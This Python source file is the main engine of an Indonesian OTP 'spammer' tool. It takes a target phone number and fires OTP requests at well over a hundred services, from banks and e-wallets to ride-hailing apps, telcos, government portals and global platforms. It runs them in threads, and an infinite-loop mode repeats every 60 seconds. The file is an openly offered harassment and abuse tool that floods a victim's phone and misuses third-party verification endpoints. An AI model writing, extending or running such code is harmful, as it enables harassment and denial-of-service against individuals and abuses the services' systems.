#!/usr/bin/env python3
# main_engine.py - OTP Spammer Engine (FIXED)
# SCRIPETEREN OTP - scripeterenotp
# Updated: Agustus 2026

import requests
import uuid
import random
import string
import time
import re
import json
import threading
import sys
import signal
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor, as_completed

from utils import normalize, fmt_08, get_public_ip, get_random_user_agent, is_success_response
from handlers import *
from targets import TARGETS

init(autoreset=True)

print_lock = threading.Lock()
stop_flag = False
global_callback = None

def log_target(idx, total, name, status, detail=""):
    with print_lock:
        if status == "SUCCESS":
            sym, col = "+", Fore.GREEN
        elif status == "LIMITED" or status == "BLOCKED":
            sym, col = "!", Fore.YELLOW
        elif status == "ERROR" or status == "TIMEOUT" or status == "CONN_ERR":
            sym, col = "x", Fore.RED
        else:
            sym, col = "-", Fore.RED
        print(f"{col}[{sym}]{Style.RESET_ALL} ({idx}/{total}) {name}: {status}" + (f" - {detail}" if detail else ""))
        if global_callback:
            try:
                global_callback(name, status, detail)
            except:
                pass

def process_target(api, target62, ip, idx, total):
    global stop_flag
    if stop_flag:
        return False

    name = api['name']
    post_type = api.get('post_type', '')
    status_text = "FAIL"
    detail = ""
    success = False
    resp = None

    try:
        # Panggil fungsi berdasarkan post_type
        if post_type == 'tokopedia':
            resp = send_tokopedia_otp(api['number_fmt'](target62))
        elif post_type == 'shopee':
            resp = send_shopee_otp(api['number_fmt'](target62))
        elif post_type == 'bukalapak':
            resp = send_bukalapak_otp(api['number_fmt'](target62))
        elif post_type == 'lazada':
            resp = send_lazada_otp(api['number_fmt'](target62))
        elif post_type == 'blibli':
            resp = send_blibli_otp(api['number_fmt'](target62))
        elif post_type == 'jdid':
            resp = send_jdid_otp(api['number_fmt'](target62))
        elif post_type == 'zalora':
            resp = send_zalora_otp(api['number_fmt'](target62))
        elif post_type == 'sociolla':
            resp = send_sociolla_otp(api['number_fmt'](target62))
        elif post_type == 'traveloka':
            resp = send_traveloka_otp(api['number_fmt'](target62))
        elif post_type == 'tiketcom':
            resp = send_tiketcom_otp(api['number_fmt'](target62))
        elif post_type == 'ovo':
            resp = send_ovo_otp(api['number_fmt'](target62))
        elif post_type == 'dana':
            resp = send_dana_otp(api['number_fmt'](target62))
        elif post_type == 'linkaja':
            resp = send_linkaja_otp(api['number_fmt'](target62))
        elif post_type == 'gopay':
            resp = send_gopay_otp(api['number_fmt'](target62))
        elif post_type == 'grabpay':
            resp = send_grabpay_otp(api['number_fmt'](target62))
        elif post_type == 'shopeepay':
            resp = send_shopeepay_otp(api['number_fmt'](target62))
        elif post_type == 'jenius':
            resp = send_jenius_otp(api['number_fmt'](target62))
        elif post_type == 'mybca':
            resp = send_mybca_otp(api['number_fmt'](target62))
        elif post_type == 'flip':
            resp = send_flip_otp(api['number_fmt'](target62))
        elif post_type == 'kredivo':
            resp = send_kredivo_otp(api['number_fmt'](target62))
        elif post_type == 'bca':
            resp = send_bca_otp(api['number_fmt'](target62))
        elif post_type == 'mandiri':
            resp = send_mandiri_otp(api['number_fmt'](target62))
        elif post_type == 'bni':
            resp = send_bni_otp(api['number_fmt'](target62))
        elif post_type == 'bri':
            resp = send_bri_otp(api['number_fmt'](target62))
        elif post_type == 'btn':
            resp = send_btn_otp(api['number_fmt'](target62))
        elif post_type == 'cimb':
            resp = send_cimb_otp(api['number_fmt'](target62))
        elif post_type == 'danamon':
            resp = send_danamon_otp(api['number_fmt'](target62))
        elif post_type == 'permata':
            resp = send_permata_otp(api['number_fmt'](target62))
        elif post_type == 'maybank':
            resp = send_maybank_otp(api['number_fmt'](target62))
        elif post_type == 'ocbc':
            resp = send_ocbc_otp(api['number_fmt'](target62))
        elif post_type == 'gojek':
            resp = send_gojek_otp(api['number_fmt'](target62))
        elif post_type == 'grab':
            resp = send_grab_otp(api['number_fmt'](target62))
        elif post_type == 'maxim':
            resp = send_maxim_otp(api['number_fmt'](target62))
        elif post_type == 'indrive':
            resp = send_indrive_otp(api['number_fmt'](target62))
        elif post_type == 'gofood':
            resp = send_gofood_otp(api['number_fmt'](target62))
        elif post_type == 'grabfood':
            resp = send_grabfood_otp(api['number_fmt'](target62))
        elif post_type == 'shopeefood':
            resp = send_shopeefood_otp(api['number_fmt'](target62))
        elif post_type == 'bluebird':
            resp = send_bluebird_otp(api['number_fmt'](target62))
        elif post_type == 'kfc':
            resp = send_kfc_otp(api['number_fmt'](target62))
        elif post_type == 'mcd':
            resp = send_mcd_otp(api['number_fmt'](target62))
        elif post_type == 'burgerking':
            resp = send_burgerking_otp(api['number_fmt'](target62))
        elif post_type == 'pizzahut':
            resp = send_pizzahut_otp(api['number_fmt'](target62))
        elif post_type == 'dominos':
            resp = send_dominos_otp(api['number_fmt'](target62))
        elif post_type == 'starbucks':
            resp = send_starbucks_otp(api['number_fmt'](target62))
        elif post_type == 'kopikenangan':
            resp = send_kopikenangan_otp(api['number_fmt'](target62))
        elif post_type == 'forecoffee':
            resp = send_forecoffee_otp(api['number_fmt'](target62))
        elif post_type == 'mytelkomsel':
            resp = send_mytelkomsel_otp(api['number_fmt'](target62))
        elif post_type == 'indosat':
            resp = send_indosat_otp(api['number_fmt'](target62))
        elif post_type == 'xl':
            resp = send_xl_otp(api['number_fmt'](target62))
        elif post_type == 'tri':
            resp = send_tri_otp(api['number_fmt'](target62))
        elif post_type == 'smartfren':
            resp = send_smartfren_otp(api['number_fmt'](target62))
        elif post_type == 'byu':
            resp = send_byu_otp(api['number_fmt'](target62))
        elif post_type == 'pln':
            resp = send_pln_otp(api['number_fmt'](target62))
        elif post_type == 'bpjs':
            resp = send_bpjs_otp(api['number_fmt'](target62))
        elif post_type == 'pedulilindungi':
            resp = send_pedulilindungi_otp(api['number_fmt'](target62))
        elif post_type == 'mypertamina':
            resp = send_mypertamina_otp(api['number_fmt'](target62))
        elif post_type == 'djp':
            resp = send_djp_otp(api['number_fmt'](target62))
        elif post_type == 'ehac':
            resp = send_ehac_otp(api['number_fmt'](target62))
        elif post_type == 'jnt':
            resp = send_jnt_otp(api['number_fmt'](target62))
        elif post_type == 'sicepat':
            resp = send_sicepat_otp(api['number_fmt'](target62))
        elif post_type == 'anteraja':
            resp = send_anteraja_otp(api['number_fmt'](target62))
        elif post_type == 'posindonesia':
            resp = send_posindonesia_otp(api['number_fmt'](target62))
        elif post_type == 'ninjaxpress':
            resp = send_ninjaxpress_otp(api['number_fmt'](target62))
        elif post_type == 'lionparcel':
            resp = send_lionparcel_otp(api['number_fmt'](target62))
        elif post_type == 'lionair':
            resp = send_lionair_otp(api['number_fmt'](target62))
        elif post_type == 'garuda':
            resp = send_garuda_otp(api['number_fmt'](target62))
        elif post_type == 'citilink':
            resp = send_citilink_otp(api['number_fmt'](target62))
        elif post_type == 'batikair':
            resp = send_batikair_otp(api['number_fmt'](target62))
        elif post_type == 'sriwijayaair':
            resp = send_sriwijayaair_otp(api['number_fmt'](target62))
        elif post_type == 'airasia':
            resp = send_airasia_otp(api['number_fmt'](target62))
        elif post_type == 'superindo':
            resp = send_superindo_otp(api['number_fmt'](target62))
        elif post_type == 'hypermart':
            resp = send_hypermart_otp(api['number_fmt'](target62))
        elif post_type == 'transmart':
            resp = send_transmart_otp(api['number_fmt'](target62))
        elif post_type == 'alfamart':
            resp = send_alfamart_otp(api['number_fmt'](target62))
        elif post_type == 'indomaret':
            resp = send_indomaret_otp(api['number_fmt'](target62))
        elif post_type == 'guardian':
            resp = send_guardian_otp(api['number_fmt'](target62))
        elif post_type == 'amazon':
            resp = send_amazon_otp(api['number_fmt'](target62))
        elif post_type == 'ebay':
            resp = send_ebay_otp(api['number_fmt'](target62))
        elif post_type == 'aliexpress':
            resp = send_aliexpress_otp(api['number_fmt'](target62))
        elif post_type == 'temu':
            resp = send_temu_otp(api['number_fmt'](target62))
        elif post_type == 'shein':
            resp = send_shein_otp(api['number_fmt'](target62))
        elif post_type == 'wish':
            resp = send_wish_otp(api['number_fmt'](target62))
        elif post_type == 'etsy':
            resp = send_etsy_otp(api['number_fmt'](target62))
        elif post_type == 'rakuten':
            resp = send_rakuten_otp(api['number_fmt'](target62))
        elif post_type == 'whatsapp_business':
            resp = send_whatsapp_business_otp(api['number_fmt'](target62))
        elif post_type == 'telegram':
            resp = send_telegram_otp(api['number_fmt'](target62))
        elif post_type == 'discord':
            resp = send_discord_otp(api['number_fmt'](target62))
        elif post_type == 'twitter':
            resp = send_twitter_otp(api['number_fmt'](target62))
        elif post_type == 'instagram':
            resp = send_instagram_otp(api['number_fmt'](target62))
        elif post_type == 'facebook':
            resp = send_facebook_otp(api['number_fmt'](target62))
        elif post_type == 'tiktok':
            resp = send_tiktok_otp(api['number_fmt'](target62))
        elif post_type == 'snapchat':
            resp = send_snapchat_otp(api['number_fmt'](target62))
        elif post_type == 'netflix':
            resp = send_netflix_otp(api['number_fmt'](target62))
        elif post_type == 'spotify':
            resp = send_spotify_otp(api['number_fmt'](target62))
        elif post_type == 'youtube':
            resp = send_youtube_otp(api['number_fmt'](target62))
        elif post_type == 'disney':
            resp = send_disney_otp(api['number_fmt'](target62))
        elif post_type == 'hbomax':
            resp = send_hbomax_otp(api['number_fmt'](target62))
        elif post_type == 'primevideo':
            resp = send_primevideo_otp(api['number_fmt'](target62))
        elif post_type == 'apple':
            resp = send_apple_otp(api['number_fmt'](target62))
        elif post_type == 'tiktokmusic':
            resp = send_tiktokmusic_otp(api['number_fmt'](target62))
        elif post_type == 'steam':
            resp = send_steam_otp(api['number_fmt'](target62))
        elif post_type == 'epic':
            resp = send_epic_otp(api['number_fmt'](target62))
        elif post_type == 'playstation':
            resp = send_playstation_otp(api['number_fmt'](target62))
        elif post_type == 'xbox':
            resp = send_xbox_otp(api['number_fmt'](target62))
        elif post_type == 'nintendo':
            resp = send_nintendo_otp(api['number_fmt'](target62))
        elif post_type == 'roblox':
            resp = send_roblox_otp(api['number_fmt'](target62))
        elif post_type == 'minecraft':
            resp = send_minecraft_otp(api['number_fmt'](target62))
        elif post_type == 'valorant':
            resp = send_valorant_otp(api['number_fmt'](target62))
        elif post_type == 'paypal':
            resp = send_paypal_otp(api['number_fmt'](target62))
        elif post_type == 'stripe':
            resp = send_stripe_otp(api['number_fmt'](target62))
        elif post_type == 'square':
            resp = send_square_otp(api['number_fmt'](target62))
        elif post_type == 'klarna':
            resp = send_klarna_otp(api['number_fmt'](target62))
        elif post_type == 'revolut':
            resp = send_revolut_otp(api['number_fmt'](target62))
        elif post_type == 'wise':
            resp = send_wise_otp(api['number_fmt'](target62))
        elif post_type == 'n26':
            resp = send_n26_otp(api['number_fmt'](target62))
        elif post_type == 'monzo':
            resp = send_monzo_otp(api['number_fmt'](target62))
        elif post_type == 'uber':
            resp = send_uber_otp(api['number_fmt'](target62))
        elif post_type == 'lyft':
            resp = send_lyft_otp(api['number_fmt'](target62))
        elif post_type == 'doordash':
            resp = send_doordash_otp(api['number_fmt'](target62))
        elif post_type == 'ubereats':
            resp = send_ubereats_otp(api['number_fmt'](target62))
        elif post_type == 'bolt':
            resp = send_bolt_otp(api['number_fmt'](target62))
        elif post_type == 'didi':
            resp = send_didi_otp(api['number_fmt'](target62))
        else:
            status_text = "SKIP"
            detail = f"Unknown post_type: {post_type}"

        # ============================================================
        # Analisis response
        # ============================================================
        if resp is not None:
            if is_success_response(resp):
                status_text = "SUCCESS"
                detail = "OTP sent"
                success = True
            else:
                # Ambil pesan error dari body
                try:
                    err_data = resp.json()
                    err_msg = err_data.get('message') or err_data.get('msg') or err_data.get('error') or ''
                    if err_msg:
                        detail = err_msg[:40]
                    else:
                        detail = f"HTTP {resp.status_code}"
                except:
                    detail = f"HTTP {resp.status_code}"
                if resp.status_code == 429:
                    status_text = "LIMITED"
                else:
                    status_text = "FAIL"
        else:
            status_text = "ERROR"
            detail = "No response (exception/timeout)"

    except requests.exceptions.Timeout:
        status_text, detail = "TIMEOUT", ""
    except requests.exceptions.ConnectionError:
        status_text, detail = "CONN_ERR", ""
    except Exception as e:
        status_text, detail = "ERROR", str(e)[:40]

    log_target(idx, total, name, status_text, detail)
    time.sleep(0.5 if success else 0.2)
    return success

def run_single_round(threads=5, target=None, callback=None):
    global stop_flag, global_callback
    stop_flag = False
    global_callback = callback
    total_apis = len(TARGETS)
    print(f"\n{Fore.CYAN}Memulai spam menggunakan {Fore.WHITE}{total_apis}{Fore.CYAN} API{Style.RESET_ALL}\n")
    if target is None:
        target = input(f"{Fore.WHITE}Nomor target (08xx / +62xx): {Style.RESET_ALL}").strip()
    if not target:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Nomor tidak boleh kosong!")
        return False
    target62 = normalize(target)
    if not target62:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Format nomor tidak valid.")
        return False
    ip = get_public_ip()
    success_count = 0
    total_targets = len(TARGETS)

    def signal_handler(sig, frame):
        global stop_flag
        stop_flag = True
        print(f"\n{Fore.YELLOW}[WARNING]{Style.RESET_ALL} Menghentikan proses...")
        raise KeyboardInterrupt

    original_handler = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, signal_handler)

    try:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(process_target, api, target62, ip, idx, total_targets) for idx, api in enumerate(TARGETS, 1) if not stop_flag]
            for future in as_completed(futures):
                if stop_flag:
                    for f in futures:
                        f.cancel()
                    break
                try:
                    if future.result():
                        success_count += 1
                except:
                    pass
    except KeyboardInterrupt:
        pass
    finally:
        signal.signal(signal.SIGINT, original_handler)
        global_callback = None

    print(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} Selesai. Sukses: {success_count}/{total_targets}")
    return success_count > 0

def run_infinite_loop(target=None, callback=None):
    global stop_flag, global_callback
    stop_flag = False
    global_callback = callback
    total_apis = len(TARGETS)
    print(f"\n{Fore.CYAN}Memulai Infinite Loop (delay 60 detik){Style.RESET_ALL}\n")
    if target is None:
        target = input(f"{Fore.WHITE}Nomor target (08xx / +62xx): {Style.RESET_ALL}").strip()
    if not target:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Nomor tidak boleh kosong!")
        return False
    target62 = normalize(target)
    if not target62:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Format nomor tidak valid.")
        return False
    ip = get_public_ip()
    total_success = 0
    total_fail = 0
    round_count = 0

    def signal_handler(sig, frame):
        global stop_flag
        stop_flag = True
        print(f"\n{Fore.YELLOW}[WARNING]{Style.RESET_ALL} Menghentikan proses...")
        raise KeyboardInterrupt

    original_handler = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, signal_handler)

    try:
        while not stop_flag:
            round_count += 1
            print(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} Round {round_count} dimulai...")
            success_count = 0
            total_targets = len(TARGETS)
            with ThreadPoolExecutor(max_workers=5) as executor:
                futures = [executor.submit(process_target, api, target62, ip, idx, total_targets) for idx, api in enumerate(TARGETS, 1) if not stop_flag]
                for future in as_completed(futures):
                    if stop_flag:
                        for f in futures:
                            f.cancel()
                        break
                    try:
                        if future.result():
                            success_count += 1
                            total_success += 1
                        else:
                            total_fail += 1
                    except:
                        total_fail += 1
            if stop_flag:
                break
            print(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} Round {round_count} selesai. Sukses: {success_count}/{total_targets}")
            print(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} Total: success={total_success} | fail={total_fail}")
            for _ in range(60):
                if stop_flag:
                    break
                time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        signal.signal(signal.SIGINT, original_handler)
        global_callback = None

    if stop_flag:
        print(f"{Fore.YELLOW}[WARNING]{Style.RESET_ALL} Proses dihentikan oleh user")
        print(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} Total success: {total_success} | fail: {total_fail}")
    return total_success > 0